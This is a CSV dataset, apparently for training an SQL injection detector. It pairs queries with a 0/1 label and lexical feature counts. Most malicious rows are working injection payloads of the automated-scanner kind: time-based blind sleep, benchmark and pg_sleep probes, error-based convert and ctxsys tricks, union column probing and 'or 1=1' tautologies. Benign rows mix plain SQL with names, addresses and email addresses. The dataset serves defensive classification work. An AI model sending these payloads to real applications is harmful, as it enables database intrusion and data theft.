Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",1,and make_set and,94,3,0,0,4,0,17,2,0,13,2,1
select count ( markid ) from him,0,select count markid from him,32,5,0,0,0,0,6,0,0,24,2,1
select secret ( s from must right join,0,select secret from must right join,38,6,0,0,0,0,7,0,0,30,4,1
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1,or convert int select char char char char char select case when then char else char end char char char char char ikqw,354,23,0,0,4,1,76,1,11,95,8,12
fuentes calientes,0,fuentes calientes,17,2,0,0,0,0,1,0,0,16,0,0
cadenat.mulich@4ghz.do,0,cadenat mulich 4ghz do,22,4,0,0,3,0,0,0,0,18,0,0
26292,0,,5,0,0,0,0,0,0,0,0,0,0,0
select * from check where powder = 'mixture',0,select from check where powder mixture,44,6,2,0,1,0,7,0,1,33,3,0
"c/ alcorac, 102",0,alcorac,15,1,0,0,1,0,2,0,1,8,0,0
yamasaki@multaspendientes.eg,0,yamasaki multaspendientes eg,28,3,0,0,2,0,0,0,0,26,0,0
select * from wrong where arrangement in  ( select grandmother from tropical ) ,0,select from wrong where arrangement in select grandmother from tropical,79,10,0,0,0,0,13,0,1,62,6,0
select count ( neighborhood ) from expect,0,select count neighborhood from expect,41,5,0,0,0,0,6,0,0,33,2,1
"1"" where 3740  =  3740 rlike sleep  (  5  )  #",1,where rlike sleep,46,3,0,1,2,1,10,0,0,15,2,1
select rich ( s )  from sail union all,0,select rich from sail union all,38,6,0,0,0,0,8,0,0,27,4,0
"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,or dbms_pipe receive_message chr chr chr chr,122,7,0,1,11,1,24,1,2,36,1,6
select * from wait where moon = 'clearly',0,select from wait where moon clearly,41,6,2,0,1,0,7,0,1,30,3,0
69054908f,0,69054908f,9,1,0,0,0,0,0,0,0,1,0,0
select count ( pick ) from stop,0,select count pick from stop,31,5,0,0,0,0,6,0,0,23,2,1
select land,0,select land,11,2,0,0,0,0,1,0,0,10,1,0
1.22216e+15,0,22216e,11,1,0,0,1,0,0,0,1,1,0,0
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1,and benchmark md5 0x76555642 and,119,5,0,0,3,0,20,2,0,18,2,2
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,1,and in char char char char char select case when then char else char end char char char char char and uwbt like uwbt,361,24,4,0,1,0,77,2,10,93,10,12
"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1,as caob where union all select,105,6,0,1,8,1,12,0,3,25,5,0
"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,select ewlk where and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,214,28,3,0,8,1,34,1,4,124,12,1
select * from north where church = 'especially',0,select from north where church especially,47,6,2,0,1,0,7,0,1,36,3,0
"-5840'  )   or elt  (  1032  =  1032,3623  )  ",1,or elt,46,2,1,0,2,0,9,1,1,5,1,1
select * from  ( select original from wall ) ,0,select from select original from wall,45,6,0,0,0,0,9,0,1,32,4,0
select count ( * )  as dried,0,select count as dried,28,4,0,0,0,0,6,0,1,18,2,1
-1769 union all select 6054--,1,union all select,29,3,0,0,0,1,4,0,3,14,3,0
"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,1,and select from select sleep fzno and,118,7,0,4,3,0,24,2,1,31,5,1
1'||  (  select 'rdqv' from dual where 1894  =  1894,1,select rdqv from dual where,52,5,3,0,3,0,9,0,0,23,3,0
"1'  )   as eany where 3169  =  3169 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,as eany where and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,163,23,1,0,9,1,28,1,3,83,9,1
select widely ( s )  from lonely full outer join,0,select widely from lonely full outer join,48,7,0,0,0,0,9,0,0,36,4,0
"1' union all select null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null,60,11,1,0,8,1,4,0,0,46,11,0
select top 3 * from swing where crew = 'feed',0,select top from swing where crew feed,45,7,2,0,1,0,9,0,1,31,4,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1,select like abcdefg upper hex randomblob and inec inec,120,9,5,0,2,0,18,1,1,46,3,3
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,or select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,132,20,1,0,8,0,22,1,1,71,7,1
duran manero,0,duran manero,12,2,0,0,0,0,1,0,0,11,0,0
select cos ( pi (   )  )  ;,0,select cos pi,27,3,0,0,1,0,7,0,0,11,1,0
"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,where and elt sleep,78,4,1,0,4,1,16,1,0,16,2,2
deying,0,deying,6,1,0,0,0,0,0,0,0,6,0,0
totino,0,totino,6,1,0,0,0,0,0,0,0,6,0,0
obdulio,0,obdulio,7,1,0,0,0,0,0,0,0,7,0,0
select * from supply where nobody = 'discover'  and  ( they = 'faster' or us = 'practical' ) ,0,select from supply where nobody discover and they faster or us practical,93,12,6,0,3,0,18,2,1,61,5,0
1   )    )     )   and   (  6148  =  3343  )  *3343 and    (    (     (  3271  =  3271,1,and and,86,2,0,0,2,0,17,2,1,6,2,0
rebolledo de la torre,0,rebolledo de la torre,21,4,0,0,0,0,3,0,0,18,0,0
" select column_name ( s )  from difference,minute",0,select column_name from difference minute,49,5,0,0,2,0,7,0,0,37,2,0
select avg ( empty ) from collect select sum ( someone ) ,0,select avg empty from collect select sum someone,57,8,0,0,0,0,12,0,0,41,3,2
.corporativo,0,corporativo,12,1,0,0,1,0,0,0,0,11,0,0
9834,0,,4,0,0,0,0,0,0,0,0,0,0,0
"   select question, barn, liefrom current where burst  is not null",0,select question barn liefrom current where burst is not null,66,10,0,0,2,0,10,1,0,51,5,0
" select * from current order by planned, behavior",0,select from current order by planned behavior,49,7,0,0,1,0,8,0,1,39,4,0
"   select colony, tonight+ ', ' + effect+ ' ' + almost+ ', ' + salt as led  from most",0,select colony tonight effect almost salt as led from most,85,10,6,0,3,0,19,0,6,48,3,0
"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,as dnhd where or select from pg_sleep,105,7,0,1,3,1,21,1,2,30,5,1
select sleep  (  5  )   and   (  1435  =  1435,1,select sleep and,46,3,0,0,1,0,9,1,0,14,2,1
"   select coffee, exercise+ ', ' + rock+ ' ' + necessary+ ', ' + parent as smell  from ran",0,select coffee exercise rock necessary parent as smell from ran,90,10,6,0,3,0,19,0,6,53,3,0
select * from pale,0,select from pale,18,3,0,0,0,0,3,0,1,14,2,0
6.9084e+15,0,9084e,10,1,0,0,1,0,0,0,1,1,0,0
"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,as iwri where or select from select sleep ydpu,113,9,0,1,1,1,24,1,3,38,6,1
select count ( * )  as leave,0,select count as leave,28,4,0,0,0,0,6,0,1,18,2,1
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,as erjh where or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,374,24,0,0,27,1,76,1,3,101,10,12
select * from putting fetch first 50 percent rows onlyselect top 3 * from human,0,select from putting fetch first percent rows onlyselect top from human,79,11,0,0,0,0,14,0,2,60,5,0
quinn,0,quinn,5,1,0,0,0,0,0,0,0,5,0,0
85233754d,0,85233754d,9,1,0,0,0,0,0,0,0,1,0,0
select * from sure where mass = 'unknown'  or leaving = 'worse',0,select from sure where mass unknown or leaving worse,63,9,4,0,2,0,11,1,1,44,4,0
8,0,,2,0,0,0,0,0,0,0,0,0,0,0
" select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",1,select from users where id or or,59,7,0,2,4,1,16,2,3,26,5,0
select   (  case when   (  7254  =  5901  )   then 1 else 7254*  (  select 7254 from master..sysdatabases  )   end  )  --,1,select case when then else select from master sysdatabases end,121,10,0,0,3,1,21,0,3,53,8,0
1.67e+15,0,67e,8,1,0,0,1,0,0,0,1,1,0,0
"calle camino getafe, 157,",0,calle camino getafe,25,3,0,0,2,0,3,0,0,17,0,0
taciano,0,taciano,7,1,0,0,0,0,0,0,0,7,0,0
ateniesa,0,ateniesa,8,1,0,0,0,0,0,0,0,8,0,0
select * from wp_users where id  =  '1' limit 1,0,select from wp_users where id limit,47,6,2,0,2,0,9,0,1,29,4,0
3.786e+15,0,786e,9,1,0,0,1,0,0,0,1,1,0,0
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,1,or select from select sleep ydpu and ckmm like ckmm,124,10,4,0,0,0,24,2,1,42,6,1
clay@parcalia.ml,0,clay parcalia ml,16,3,0,0,2,0,0,0,0,14,0,0
select * from beginning where many = 'wheat'  and city = 'goose',0,select from beginning where many wheat and city goose,64,9,4,0,2,0,11,1,1,45,4,0
mahl iglesia,0,mahl iglesia,12,2,0,0,0,0,1,0,0,11,0,0
calle puerto de alcolea 185 9-e,0,calle puerto de alcolea,31,4,0,0,0,0,5,0,1,21,0,0
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1,select case when then else select from master sysdatabases end,121,10,0,0,3,1,21,0,3,53,8,0
select * from coal fetch first 50 percent rows only,0,select from coal fetch first percent rows only,51,8,0,0,0,0,9,0,1,39,3,0
select * from dog,0,select from dog,17,3,0,0,0,0,3,0,1,13,2,0
enaciado,0,enaciado,8,1,0,0,0,0,0,0,0,8,0,0
aldea del cano,0,aldea del cano,14,3,0,0,0,0,2,0,0,12,0,0
"insert into fox ( helpful, being, like, harder, pound, contain )  values  ( 'growth', 'attention'. should', 'clearly', 'instead', 'studied', 'ahead' )  ",0,insert into fox helpful being like harder pound contain values growth attention should clearly instead studied ahead,152,17,13,0,11,0,21,0,0,100,4,0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,335,22,0,0,25,0,71,1,1,80,8,10
1'+  (  select hvsb where 3666  =  3666,1,select hvsb where,39,3,1,0,1,0,7,0,1,15,2,0
godiva,0,godiva,6,1,0,0,0,0,0,0,0,6,0,0
1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,where or select from select sleep sddo,103,7,0,0,2,1,22,1,1,32,5,1
caball,0,caball,6,1,0,0,0,0,0,0,0,6,0,0
select case ( s )  from whom left join,0,select case from whom left join,38,6,0,0,0,0,8,0,0,27,5,1
select * from mood where copper between '1996-07-01' and '1996-07-31',0,select from mood where copper between and,69,7,4,0,0,0,9,1,5,35,5,0
castil de vela,0,castil de vela,14,3,0,0,0,0,2,0,0,12,0,0
select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when then else cast as int select from dual end from dual,133,14,0,0,1,1,28,0,3,56,10,0
select avg ( join ) from rocky,0,select avg join from rocky,30,5,0,0,0,0,6,0,0,22,3,1
-4219' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,or in char char char char char select case when then char else char end char char char char char,331,20,1,0,1,0,72,1,11,77,8,12
"  select * from baby where our in  ( 'grown', 'single', 'examine' )  ",0,select from baby where our in grown single examine,69,9,6,0,2,0,13,0,1,42,4,0
-9653'  )   where 2705  =  2705 or 9323  =  9323#,1,where or,49,2,1,0,3,1,9,1,1,7,2,0
"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",1,select dbms_pipe receive_message chr chr chr chr from dual,124,9,0,0,10,1,22,0,2,48,2,6
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 347687 )  order by meta_id asc",0,select post_id meta_key meta_value from wp_postmeta where post_id in order by meta_id asc,104,13,0,0,8,0,15,0,0,71,7,0
8.18595e+15,0,18595e,11,1,0,0,1,0,0,0,1,1,0,0
goring@quadernideilgarda.pl,0,goring quadernideilgarda pl,27,3,0,0,2,0,0,0,0,25,0,0
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1,and and xkfu xkfu,56,4,4,0,2,0,11,2,1,14,2,0
"c/ el columpio 13,",0,el columpio,18,2,0,0,1,0,3,0,1,11,0,0
8l077ra,0,8l077ra,7,1,0,0,0,0,0,0,0,3,0,0
select location from choice,0,select location from choice,27,4,0,0,0,0,3,0,0,24,2,0
"1""  )   as awdg where 9512  =  9512",1,as awdg where,35,3,0,1,1,0,7,0,0,11,2,0
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",1,and select from pg_sleep and ipqw like ipqw,120,8,0,4,2,0,22,2,0,35,5,1
mendie,0,mendie,6,1,0,0,0,0,0,0,0,6,0,0
37219,0,,5,0,0,0,0,0,0,0,0,0,0,0
!,0,,2,0,0,0,1,0,0,0,0,0,0,0
select count ( underline )  from did,0,select count underline from did,36,5,0,0,0,0,6,0,0,27,2,1
"  select pond,row from native where hold = 'threw' union select buffalo, force from she",0,select pond row from native where hold threw union select buffalo force from she,87,14,2,0,3,0,14,0,0,67,6,0
"1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm",1,and elt and bpzm bpzm,69,5,4,0,3,0,13,2,0,17,2,1
mastelero,0,mastelero,9,1,0,0,0,0,0,0,0,9,0,0
14188360m,0,14188360m,9,1,0,0,0,0,0,0,0,1,0,0
select * from law where price not between 10 and 20,0,select from law where price not between and,51,8,0,0,0,0,10,2,1,36,6,0
lakshmin,0,lakshmin,8,1,0,0,0,0,0,0,0,8,0,0
"-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and ixix like ixix,353,26,4,0,25,0,73,2,1,95,10,10
select column_name from table_name where exists,0,select column_name from table_name where exists,47,6,0,0,2,0,5,0,0,40,4,0
"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1,where union all select,94,4,0,1,10,1,9,0,1,19,4,0
c/ agachadilla 81,0,agachadilla,17,1,0,0,0,0,2,0,1,12,0,0
select top 3 * from equipment where stream = 'guide' select * from particular,0,select top from equipment where stream guide select from particular,77,10,2,0,1,0,13,0,2,58,6,0
select * from element 3,0,select from element,23,3,0,0,0,0,4,0,1,17,2,0
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1,union all select,80,3,0,1,11,1,5,0,1,14,3,0
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,as jrzr where and char char char char regexp_substring repeat left crypt_key char char char null null,274,17,0,0,18,1,55,1,2,83,6,11
"  select driverid as id, string as year from event",0,select driverid as id string as year from event,50,9,0,0,1,0,9,0,0,39,4,0
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1,or elt and zewv like zewv,97,6,0,4,2,0,17,2,1,20,3,1
select * from  ( select clothes from home ) ,0,select from select clothes from home,44,6,0,0,0,0,9,0,1,31,4,0
char@39a+@select,1,char 39a select,16,3,0,0,2,0,0,0,1,11,1,1
hiss@ajuntamentdebarcelona20.yu,0,hiss ajuntamentdebarcelona20 yu,31,3,0,0,2,0,0,0,0,27,0,0
